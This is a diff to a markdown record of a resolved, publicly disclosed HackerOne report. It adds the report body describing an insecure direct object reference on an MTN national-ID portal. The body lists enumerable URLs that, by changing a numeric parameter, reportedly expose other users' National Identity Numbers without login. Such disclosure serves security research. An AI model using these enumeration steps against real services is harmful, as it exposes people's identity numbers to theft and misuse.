@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Insecure Direct Object Reference (IDOR)"
 enriched: true
+body: true
 date: 2022-12-01
 submitted: 2022-04-11T00:18:26.846Z
 bounty_usd: null
@@ -25,6 +26,33 @@ title: "Unprotected Direct Object Reference"
 - Report: [https://hackerone.com/reports/1536936](https://hackerone.com/reports/1536936)
 - CWE: Insecure Direct Object Reference (IDOR)
 - Submitted: 2022-04-11T00:18:26.846Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hello MTN Security Team,
+During my hunting,
+I discovered that there's an Insecure Direct Object Reference  on https://nin.mtnonline.com 
+Vulnerable Path:  https://nin.mtnonline.com/nin/success?message=1
+
+Steps To Reproduce:
+You may not even require to submit any NIN before accessing this unprotected page,
+Just visit https://nin.mtnonline.com/nin/success?message=1 
+
+I discovered that, to  see other user's NIN, it only require 2 difference , example
+https://nin.mtnonline.com/nin/success?message=3
+https://nin.mtnonline.com/nin/success?message=5
+https://nin.mtnonline.com/nin/success?message=7
+https://nin.mtnonline.com/nin/success?message=9
+https://nin.mtnonline.com/nin/success?message=11
+https://nin.mtnonline.com/nin/success?message=1901
+https://nin.mtnonline.com/nin/success?message=1903
+https://nin.mtnonline.com/nin/success?message=8001
+
+## Impact
+
+This bug exposed all the submitted Nigerians National Identity Number (NIN) .which can be abused in other way else if found out by a malicious person
 
 ## Timeline
 
